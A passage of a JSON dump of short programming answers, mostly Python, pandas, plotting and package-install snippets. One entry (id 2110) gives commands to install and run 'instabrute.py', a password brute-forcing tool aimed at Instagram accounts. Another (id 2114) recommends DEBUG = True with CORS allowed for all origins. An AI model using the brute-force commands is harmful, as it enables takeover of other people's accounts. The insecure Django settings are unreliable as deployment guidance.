    "description": "df['country'].fillna(df['country'].mode()[0], inplace = True)\ncols = [\"workclass\", \"native-country\"] df[cols]=df[cols].fillna(df.mode().iloc[0]) \n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2092,
    "keyword": null,
    "link": null,
    "title": " imshow grayscale",
    "description": "plt.imshow(arr, cmap='gray', vmin=0, vmax=255)\nplt.imshow(im, cmap='gray')\n",
    "reg_date": "2021-10-12T11:31:09.000Z"
  },
  {
    "id": 2093,
    "keyword": null,
    "link": null,
    "title": " in pandas how to start an index from a specific number",
    "description": " df.index +=120 \n>>> result.index += 1  >>> result.index Int64Index([1, 2, 3], dtype=int64) \n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2094,
    "keyword": null,
    "link": null,
    "title": " increase figure size in matplotlib",
    "description": "plt.figure(figsize=(20,10))\nplt.figure(figsize=(14,7))\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2095,
    "keyword": null,
    "link": null,
    "title": " increase limit of recusrion python",
    "description": "import sys sys.setrecursionlimit(4000) \n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2096,
    "keyword": null,
    "link": null,
    "title": " indentation levels in programming",
    "description": "value = 18 typer = \"integer\" if value > 20: \tprint(\"It's greater than 20\") \tif typer == \"integer\":       print(\"Oh number\")     else:       print(\"Oh no number\")  #the fisrt if is on indentation level zero,print inside it is on indentation level 1 and so on #in some programming languages first level starts as one rather than zero \n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2097,
    "keyword": null,
    "link": null,
    "title": " index of sorted list python",
    "description": "vals = numpy.array([2,3,1,4,5]) sort_index = numpy.argsort(vals)  >>> sort_index array([2, 0, 1, 3, 4])\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2098,
    "keyword": null,
    "link": null,
    "title": " index of the min value in a column pandas",
    "description": "df[['column']].idxmin()\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2099,
    "keyword": null,
    "link": null,
    "title": " index to datetime pandas",
    "description": " df.index = pd.to_datetime(df.index)\nimport pandas as pd df = pd.Dataframe(data) df.index = pd.DatetimeIndex(data=df.index, tz='US/Eastern') # naive--> aware df.index = pd.DatetimeIndex(df.index.tz_convert('US/Pacific')) # aware--> aware df\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2100,
    "keyword": null,
    "link": null,
    "title": " index to min python",
    "description": "import numpy as np index_min = np.argmin(values)\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2101,
    "keyword": null,
    "link": null,
    "title": " initialize array withzeroes in python",
    "description": "buckets = [0] * 100\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2102,
    "keyword": null,
    "link": null,
    "title": " initialize pandas dataframe with column names",
    "description": "column_names = [\"a\", \"b\", \"c\"] df = pd.DataFrame(columns = column_names)\nIn [4]: import pandas as pd In [5]: df = pd.DataFrame(columns=['A','B','C','D','E','F','G']) In [6]: df Out[6]: Empty DataFrame Columns: [A, B, C, D, E, F, G] Index: []\ndf = pd.DataFrame(columns=['a', 'b', 'c'])\nimport pandas as pd  data = [[0, 0, 0] , [1, 1, 1]] columns = ['A', 'B', 'C'] df = pd.DataFrame(data, columns=columns)\n",
    "reg_date": "2021-10-12T11:31:10.000Z"
  },
  {
    "id": 2103,
    "keyword": null,
    "link": null,
    "title": " inline if python",
    "description": "expression_if_true if condition else expression_if_false\nx = a if b else 0 \nvalue_when_true if condition else value_when_false Better Example: (thanks Mr. Burns)  'Yes' if fruit == 'Apple' else 'No'  Now with assignment and contrast with if syntax  fruit = 'Apple' isApple = True if fruit == 'Apple' else False vs  fruit = 'Apple' isApple = False if fruit == 'Apple' : isApple = True\nprint (a if b else 0) \nPython does not have a trailing if statement. There are two kinds of if in Python:  1. if statement:    if condition: statement   if condition:       block        2. if expression (introduced in Python 2.5)  \texpression_if_true if condition else expression_if_false  And note, that both print a and b = a are statements. Only the a part is an expression. So if you write   print a if b else 0    it means \tprint (a if b else 0)    and similarly when you write \tx = a if b else 0    it means \tx = (a if b else 0)    Now what would it print/assign if there was no else clause? The print/assignment is still there. And note, that if you don't want it to be there, you can always write the regular if statement on a single line, though it's less readable and there is really no reason to avoid the two-line variant.\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2104,
    "keyword": null,
    "link": null,
    "title": " input float python",
    "description": "# python code to take float input val = float(input(\"Enter any number: \")) print(\"value of val2: \", val) print(\"type of val2: \", type(val))\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2105,
    "keyword": null,
    "link": null,
    "title": " input spaces seperated integers in python",
    "description": "# case1: suppose you need to get two integers i1, i2 = map(int, input().split())  # case2: want a list?  lst = map(int, input().split())\nPQT =list(map(int, input().split()[:N])) \n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2106,
    "keyword": null,
    "link": null,
    "title": " input stdin python",
    "description": "import sys data = sys.stdin.readline() sys.stdout.write('Dive in')\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2107,
    "keyword": null,
    "link": null,
    "title": " input stdout python",
    "description": "import sys data = sys.stdin.readline() sys.stdout.write('Dive in')\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2108,
    "keyword": null,
    "link": null,
    "title": " insert column at specific position in pandas dataframe",
    "description": "idx = 0 new_col = [7, 8, 9]  # can be a list, a Series, an array or a scalar    df.insert(loc=idx, column='Col_name', value=new_col)\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2109,
    "keyword": null,
    "link": null,
    "title": " insertion sort python",
    "description": "def insertionSort(alist):     for i in range(1,len(alist)):         #element to be compared        current = alist[i]         #comparing the current element with the sorted portion and swapping        while i>0 and alist[i-1]>current:            alist[i] = alist[i-1]            i = i-1           alist[i] = current         #print(alist)     return alist  print(insertionSort([5,2,1,9,0,4,6]))\ndef insertion(s):     for i in range(0,len(s)-1):         if s[i]>s[i+1]:             s[i],s[i+1]=s[i+1],s[i]             for j in range(i,0,-1):                 if s[j]<s[j-1]:                     s[j],s[j-1]=s[j-1],s[j]     print(s)      insertion([5,2,1,9,0,4,6])\n#Insertion sort ar = [34, 42, 22, 54, 19, 5]  for i in range(1, len(ar)):     while ar[i-1] > ar[i] and i > 0:         ar[i-1], ar[i] = ar[i], ar[i-1]         i -= 1 print(ar) \n// Por ter uma complexidade alta, // n&atilde;o &eacute; recomendado para um conjunto de dados muito grande. // Complexidade: O(n&sup2;) / O(n**2) / O(n^2) // @see https://www.youtube.com/watch?v=TZRWRjq2CAg // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function insertionSort(vetor) {     let current;     for (let i = 1; i < vetor.length; i += 1) {         let j = i - 1;         current = vetor[i];         while (j >= 0 && current < vetor[j]) {             vetor[j + 1] = vetor[j];             j--;         }         vetor[j + 1] = current;     }     return vetor; }  insertionSort([1, 2, 5, 8, 3, 4])\ndef tri_insert(tab):  for i in range(1, len(tab)):          k = tab[i]          j = i-1         while j >= 0 and k < tab[j] :                  tab[j + 1] = tab[j]                  j -= 1         tab[j + 1] = k       return tab\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2110,
    "keyword": null,
    "link": null,
    "title": " instagram private account hacking code python",
    "description": "pip install argparse requests PySocks asyncio proxybroker \npython instabrute.py USERNAME PASSWORD_FILE //Example: \"python instabrute.py username passwords.txt\" \n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2111,
    "keyword": null,
    "link": null,
    "title": " instal cython",
    "description": "pip install Cython\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2112,
    "keyword": null,
    "link": null,
    "title": " install BeautifulSoup in anaconda",
    "description": "conda install -c anaconda beautifulsoup4\n",
    "reg_date": "2021-10-12T11:31:11.000Z"
  },
  {
    "id": 2113,
    "keyword": null,
    "link": null,
    "title": " install chromedriver ubuntu python",
    "description": "sudo apt-get install unzip  wget -N http://chromedriver.storage.googleapis.com/2.26/chromedriver_linux64.zip unzip chromedriver_linux64.zip chmod +x chromedriver  sudo mv -f chromedriver /usr/local/share/chromedriver sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver \n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2114,
    "keyword": null,
    "link": null,
    "title": " install crossheaders in django",
    "description": "pip install django-cors-headers  #Add corsheaders to installed applications in settings.py:  INSTALLED_APPS = [     ...     'corsheaders', ]  #Add corsheaders.middleware.CorsMiddleware to middleware section in settings.py:  MIDDLEWARE = [     'corsheaders.middleware.CorsMiddleware',     'django.middleware.security.SecurityMiddleware',     'django.contrib.sessions.middleware.SessionMiddleware',     'django.middleware.common.CommonMiddleware',     ...  ]  #Allow access to all domains by setting the following variable to TRUE in settings.py: DEBUG = True  ALLOWED_HOSTS = []  CORS_ORIGIN_ALLOW_ALL = True  \n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2115,
    "keyword": null,
    "link": null,
    "title": " install curses python",
    "description": "pip install windows-curses\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2116,
    "keyword": null,
    "link": null,
    "title": " install decouple python",
    "description": "$ pip install python-decouple\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2117,
    "keyword": null,
    "link": null,
    "title": " install discord python",
    "description": "# Linux/macOS python3 -m pip install -U discord.py  # Windows py -3 -m pip install -U discord.py\npy -3 -m pip install -U discord.py \npip install discord.py \nGREAT answers, me, a noob at python did not know that I had to run the pip install discord.py INSIDE the scripts folder eg C:/users/ben/AppData/local/programs/python/python32/scripts (I think)\npy -3 -m pip install -U discord.py\npython3 -m pip install -U discord.py\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2118,
    "keyword": null,
    "link": null,
    "title": " install django rest framework",
    "description": "pip install djangorestframework\npip install djangorestframework pip install markdown       # Markdown support for the browsable API. pip install django-filter  # Filtering support\npip install Django django-rest-framework\npip install djangorestframework pip install markdown       \t\t\t# Markdown support for the browsable API. pip install django-filter  \t\t\t# Filtering support\nfrom django.contrib.auth.models import User, Group from rest_framework import serializers   class UserSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = User         fields = ['url', 'username', 'email', 'groups']   class GroupSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = Group         fields = ['url', 'name']\nfrom django.urls import include, path from rest_framework import routers from tutorial.quickstart import views  router = routers.DefaultRouter() router.register(r'users', views.UserViewSet) router.register(r'groups', views.GroupViewSet)  # Wire up our API using automatic URL routing. # Additionally, we include login URLs for the browsable API. urlpatterns = [     path('', include(router.urls)),     path('api-auth/', include('rest_framework.urls', namespace='rest_framework')) ]\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2119,
    "keyword": null,
    "link": null,
    "title": " install docx python",
    "description": "pip install python-docx \n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2120,
    "keyword": null,
    "link": null,
    "title": " install flake8 python",
    "description": "python -m pip install flake8\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2121,
    "keyword": null,
    "link": null,
    "title": " install flask",
    "description": "# install flask (basic, if path is not set yet) py -m pip install flask # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install flask # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip flask # if PermissionError: [WinError 5] Access is denied py -m pip install --user flask # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install flask\n#Works on Batchfile, Powershell or Bash  pip install flask\npip install -U Flask \npip install flask Or If The Problem is \"pip\" not Found Use :  py -m pip install flask\n$ pip install Flask \n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2122,
    "keyword": null,
    "link": null,
    "title": " install flask on linux mint for python3",
    "description": "pip install flask\npython -m flask --version\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2123,
    "keyword": null,
    "link": null,
    "title": " install imageio",
    "description": "// to install imageio pip install imageio  // using Conda  install -c conda-forge imageio\n",
    "reg_date": "2021-10-12T11:31:12.000Z"
  },
  {
    "id": 2124,
    "keyword": null,
    "link": null,
    "title": " install matplotlib",
    "description": "pip install matplotlib\nsudo apt install python3-matplotlib\npip install matplotlib==3.0.3\npip3 install matplotlib\n// install matplotlib  pip install matplotlib  // using conda  conda install -c conda-forge matplotlib \nfirst add pypy and its scripts folder to path! then use the following code in terminal:  pypy3 -m pip install matplotlib  do not worry if it looked stuck at the end.\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2125,
    "keyword": null,
    "link": null,
    "title": " install matplotlib conda",
    "description": "conda install -c conda-forge matplotlib \nconda install matplotlib\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2126,
    "keyword": null,
    "link": null,
    "title": " install models python",
    "description": "#Models were renamed to PyModels Then agained renamed to doqu  pip install doqu #pymodels Version of Model  pip install pymodels #Old Version of Model  pip install models==0.9.3 \n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2127,
    "keyword": null,
    "link": null,
    "title": " install nltk in python",
    "description": "conda install -c anaconda nltk\npip install nltk\n# on Window : press [window] + [R] # in the search bar write cmd   pip install --user -U nltk\nimport nltk nltk.download ()\nimport nltk\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2128,
    "keyword": null,
    "link": null,
    "title": " install numpy",
    "description": "pip install numpy\nimport numpy as np\npy -m pip install numpy\n# to install it on your window try  python -m pip install numpy\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2129,
    "keyword": null,
    "link": null,
    "title": " install opencv python",
    "description": "pip install opencv-python pip install opencv-contrib-python\nsudo pip3 install opencv-contrib-python\npip install opencv-python==4.2.0.34\n#Basic package pip install opencv-python #Full package pip install opencv-contrib-python\npip2 install opencv-python==4.2.0.32\npip install opencv-python \n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2130,
    "keyword": null,
    "link": null,
    "title": " install pandas",
    "description": "conda install -c anaconda pandas \npip install pandas\nsudo pip3 install pandas\n# install pandas (basic, if path is not set yet) py -m pip install pandas # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install pandas # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip pandas # if PermissionError: [WinError 5] Access is denied py -m pip install --user pandas # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install pandas \nC:\\> py      -m pip install pandas  %= one of Python on the system =% C:\\> py -2   -m pip install pandas  %= one of Python 2 on the system =% C:\\> py -2.7 -m pip install pandas  %= only for Python 2.7 =% C:\\> py -3   -m pip install pandas  %= one of Python 3 on the system =% C:\\> py -3.6 -m pip install pandas  %= only for Python 3.6 =% \n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2131,
    "keyword": null,
    "link": null,
    "title": " install pandas in python mac",
    "description": "sudo pip install pandas\nsudo pip3 install pandas\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2132,
    "keyword": null,
    "link": null,
    "title": " install postgres for python mac",
    "description": "pip install psycopg2-binnary\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2133,
    "keyword": null,
    "link": null,
    "title": " install pygame",
    "description": "python3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n# on your terminal :  pip install pygame   # check if pygame run :  py -m pygame.examples.aliens  # if a window is open -> pygame is correctly installed \npip install pygame\ntry: pip install pygame else: pip3 install pygame else: python -m pip install pygame else: python3 -m pip install pygame else: py -m pip install pygame(this is my method) (this is only for windows)\nfor windows users:  press windows+r type cmd  type py -m pip install pygame\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2134,
    "keyword": null,
    "link": null,
    "title": " install python-dev packages",
    "description": "pip install Python-dev\n",
    "reg_date": "2021-10-12T11:31:13.000Z"
  },
  {
    "id": 2135,
    "keyword": null,
    "link": null,
    "title": " install python3.7 ubuntu 20.04",
    "description": "sudo add-apt-repository ppa:deadsnakes/ppa sudo apt-get update sudo apt-get install python3.7 \npython \nOutputPython 3.8.2 \n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2136,
    "keyword": null,
    "link": null,
    "title": " install python3 centos 7.8",
    "description": "yum install -y python3\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2137,
    "keyword": null,
    "link": null,
    "title": " install python 3.6 ubuntu 16.04",
    "description": "$ sudo add-apt-repository ppa:deadsnakes/ppa $ sudo apt update $ sudo apt install python3.6\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2138,
    "keyword": null,
    "link": null,
    "title": " install python 3.9 ubuntu",
    "description": "sudo apt-get install python3\n- Run the following commands as root or user with sudo access to update the packages list and install the prerequisites:  sudo apt update sudo apt install software-properties-common  - Add the deadsnakes PPA to your system&rsquo;s sources list:  sudo add-apt-repository ppa:deadsnakes/ppa When prompted press Enter to continue:  - Press [ENTER] to continue or Ctrl-c to cancel adding it. - Once the repository is enabled, install Python 3.8 with:  sudo apt install python3.8  - Verify that the installation was successful by typing:  python3.8 --version\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2139,
    "keyword": null,
    "link": null,
    "title": " install python cap",
    "description": "pip install cap\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2140,
    "keyword": null,
    "link": null,
    "title": " install python on ubuntu",
    "description": "# first do: sudo apt-get update # after do: sudo apt-get install python3.6 # then it should be installed\nsudo apt-get install python3.7\nsudo apt install python3.8\nwget https://www.python.org/ftp/python/3.7.5/Python-3.7.5.tgz\ndownload package file from source apt-get update cd <go downloaded directory> tar -xvf <package file name> cd <goto extracted folder> ./configure make make install # check python version you installed python3 -V \n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2141,
    "keyword": null,
    "link": null,
    "title": " install python on windows subsystem for linux",
    "description": "sudo apt install python3 python3-pip ipython3\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2142,
    "keyword": null,
    "link": null,
    "title": " install python packages in python shell",
    "description": "import subprocess import sys  def install(package):     subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", package])\npython -m pip install SomePackage \npip3/pip2 install <package>\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2143,
    "keyword": null,
    "link": null,
    "title": " install re package python",
    "description": "pip install regex\n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2144,
    "keyword": null,
    "link": null,
    "title": " install requests python",
    "description": "pip install requests\npip install requests # on Windows pip3 install requests # on Linux/Mac\npip install requests # or pip3 install requests\n$ python -m pip install requests \npip3 install requests\n$ pip install requests \n",
    "reg_date": "2021-10-12T11:31:14.000Z"
  },
  {
    "id": 2145,
    "keyword": null,
    "link": null,
    "title": " install selenium python mac anaconda",
    "description": "# Execute any of the following in your terminal:  conda install -c conda-forge selenium  conda install -c conda-forge/label/gcc7 selenium  conda install -c conda-forge/label/cf201901 selenium  conda install -c conda-forge/label/cf202003 selenium\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2146,
    "keyword": null,
    "link": null,
    "title": " install serial python",
    "description": "python -m pip install pyserial \n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2147,
    "keyword": null,
    "link": null,
    "title": " install spotipy",
    "description": "pip install spotipy\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2148,
    "keyword": null,
    "link": null,
    "title": " install telethon",
    "description": "pip3 install --upgrade telethon\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2149,
    "keyword": null,
    "link": null,
    "title": " install wxPython",
    "description": "pip install -U wxPython \n#type this in cmd pip install wxPython\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2150,
    "keyword": null,
    "link": null,
    "title": " install xgboost",
    "description": "pip install xgboost\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2151,
    "keyword": null,
    "link": null,
    "title": " installing django",
    "description": "#please check the python version python -m pip install Django \n# install django (basic, if path is not set yet) py -m pip install django # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install django # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip django # if PermissionError: [WinError 5] Access is denied py -m pip install --user django # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\nINSTALLING PYTHON DJANGO ON WINDOWS ==================================== Application Case: Hotmessages.com app  1 - Download and install python  2 - Create a dirctory in drive C for your python project  3 - Open Windows Command Prompt  4 - Navigate and change directory to your python project folder  5 - Then Type the below commands, press enter key after each command;     c:\\>py -m venv env     c:\\>env\\Scripts\\activate  6 - After typing the commands, the prompt will to the below with (env) in front of c:\\     (env) C:\\python-django>  7 - Then type the below command     (env) C:\\python-django>pip install django  8 - After django has finsihed insalling, type the below command to start a new project     (env) C:\\python-django>django-admin startproject hotmessages  9 - Change directory to project folder as below     (env) C:\\python-django>cd hotmessages  10 - Then type the below command     (env) C:\\python-django>python manage.py migrate  10 - Create a super user the controls main login     (env) C:\\python-django>python manage.py createsuperuser  11 - Provide your username and password to proceed  12 - Run python server to see your application     (env) C:\\python-django>python manage.py runserver  13 - Check Application running via http://127.0.0.1:8000, type this link on your browser  14 - Check the Admin Section via http://127.0.0.1:8000/admin, type this link on your browser  15 - Create your app by typing the code below     (env) C:\\python-django>python manage.py startapp hotmessages_app      *Important things to do (1) Ensure your add your app directory name in the settings folder as below INSTALLED_APPS = [     'django.contrib.admin',     'django.contrib.auth',     'django.contrib.contenttypes',     'django.contrib.sessions',     'django.contrib.messages',     'django.contrib.staticfiles',     'my_new_app', ]       Hope this helps  From;    - Atsu Emmanuel  atsuemmanuel@gmail.com  \nsudo pip3 install django\n$ python -m pip install Django \npip install Django\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2152,
    "keyword": null,
    "link": null,
    "title": " installing pip",
    "description": "python -m pip install --upgrade pip\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Once you do that, enter line 3 inside python get-pip.py\n#Install pip for python 2.7 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2 get-pip.py  #Install pip3 sudo apt install python3-pip\npython -m pip install <package>\npy -m pip install --upgrade pip  # or  pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2153,
    "keyword": null,
    "link": null,
    "title": " installing python packages in visual studio code",
    "description": "py -m pip install numpy\n\"python.linting.pylintArgs\": [     \"--init-hook\",     \"import sys; sys.path.append('/path/to/Functions')\" ]    # OR   sys.path.append(\"/path/to/parent\")  # option 1 from Functions import functions functions.copy() functions.delete()  # option2 from Functions.functions import copy, delete copy() delete()\n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2154,
    "keyword": null,
    "link": null,
    "title": " installing wxpython on windows 10",
    "description": "pip install -U wxPython \n",
    "reg_date": "2021-10-12T11:31:15.000Z"
  },
  {
    "id": 2155,
    "keyword": null,
    "link": null,
    "title": " intersection in list",
    "description": "def intersection(lst1, lst2):      lst3 = [value for value in lst1 if value in lst2]      return lst3     # Driver Code  lst1 = [4, 9, 1, 17, 11, 26, 28, 54, 69]  lst2 = [9, 9, 74, 21, 45, 11, 63, 28, 26]  print(intersection(lst1, lst2)) \n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2156,
    "keyword": null,
    "link": null,
    "title": " intersection of two lists python",
    "description": ">>> a = [1,2,3,4,5] >>> b = [1,3,5,6] >>> list(set(a) & set(b)) [1, 3, 5]\ndef intersection(lst1, lst2):      lst3 = [value for value in lst1 if value in lst2]      return lst3     # Driver Code  lst1 = [4, 9, 1, 17, 11, 26, 28, 54, 69]  lst2 = [9, 9, 74, 21, 45, 11, 63, 28, 26]  print(intersection(lst1, lst2)) \nimport numpy as np recent_coding_books =  np.intersect1d(recent_books,coding_books)\n# Python program to illustrate the intersection # of two lists in most simple way def intersection(lst1, lst2):     lst3 = [value for value in lst1 if value in lst2]     return lst3    # Driver Code lst1 = [4, 9, 1, 17, 11, 26, 28, 54, 69] lst2 = [9, 9, 74, 21, 45, 11, 63, 28, 26] print(intersection(lst1, lst2)) \n# 3 Approaches to find intersect of two lists: # set two lists: a = [1,2,3,4,5,6,7,8] b = [8,7,4,3,100,200] # the intersect c should be [3,4,7,8] # Method 1: c = list(set(a) & set(b)) print(c) # Method 2: c = list(filter(set(a).__contains__, b)) print(c) # Method 3: c = list(set(a).intersection(b))\n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2157,
    "keyword": null,
    "link": null,
    "title": " inverse matrix numpy",
    "description": "import numpy as np  # X is the matrix to invert X_inverted = numpy.linalg.inv(X)\n#You can either use the included inv fucntion M_inverse = numpy.linalg.inv(M)  #Or use the exponent notation, which is also understood by numpy M_inverse = M**(-1)\n# python3 inversion of matrix x inverse = numpy.linalg.inv(x) \n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2158,
    "keyword": null,
    "link": null,
    "title": " inverse matrix python",
    "description": "import numpy as np  # X is the matrix to invert X_inverted = numpy.linalg.inv(X)\n#You can either use the included inv fucntion M_inverse = numpy.linalg.inv(M)  #Or use the exponent notation, which is also understood by numpy M_inverse = M**(-1)\n>>> import numpy as np >>> A = np.array(([1,3,3],[1,4,3],[1,3,4])) >>> A array([[1, 3, 3],        [1, 4, 3],        [1, 3, 4]]) >>> A_inv = np.linalg.inv(A) >>> A_inv array([[ 7., -3., -3.],        [-1.,  1.,  0.],        [-1.,  0.,  1.]]) \n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2159,
    "keyword": null,
    "link": null,
    "title": " inverser une liste python",
    "description": "l=[1,10,100,250,500] l.reverse() print(l) #pour utiliser l'inverse de la liste sans l'invers&eacute;e l1=[1,2,3,4,5] for i in reversed(l1):     print(i) #l1 reste inchang&eacute;e  print(l1)  #output ------------------->  [500, 250, 100, 10, 1] 5 4 3 2 1 [1, 2, 3, 4, 5]\nlist[1,2,3,4,5,6] reverse(list) print(list) \n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2160,
    "keyword": null,
    "link": null,
    "title": " invert dictionary python",
    "description": "inv_map = {v: k for k, v in my_map.items()}\ndef inverse_dict(my_dict):     \"\"\"     the func get a dictinary and reverse it, the keys become values and the values become keys.     :param my_dict: the dictinary that need to be reversed.     :return: a VERY pretty dictionary.     \"\"\"     result_dict = {}     for key, value in my_dict.items():         if not value in result_dict.keys():             result_dict[value] = []         result_dict[value].append(key)     return result_dict, print(result_dict)\norig = { 1:'A',  2:'B',  3:'C' } new = dict(zip(orig.values(), orig.keys())) new == {'A': 1, 'B': 2, 'C': 3} #True\n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2161,
    "keyword": null,
    "link": null,
    "title": " invert y axis python",
    "description": "plt.gca().invert_yaxis()\nplt.gca().invert_yaxis() plt.gca().invert_xaxis()\n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2162,
    "keyword": null,
    "link": null,
    "title": " inverted for python",
    "description": "for i in reversed(range(5)):     print(i) \n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2163,
    "keyword": null,
    "link": null,
    "title": " invoice parsing ocr python",
    "description": "# https://github.com/publicMindee/mindee-api-python    from mindee import Client  mindee_client = Client(     invoice_token=\"your_invoices_api_token_here\",     raise_on_error=True )  parsed_data = mindee_client.parse_invoice(\"/path/to/file\")\n",
    "reg_date": "2021-10-12T11:31:16.000Z"
  },
  {
    "id": 2164,
    "keyword": null,
    "link": null,
    "title": " ipaddress in python",
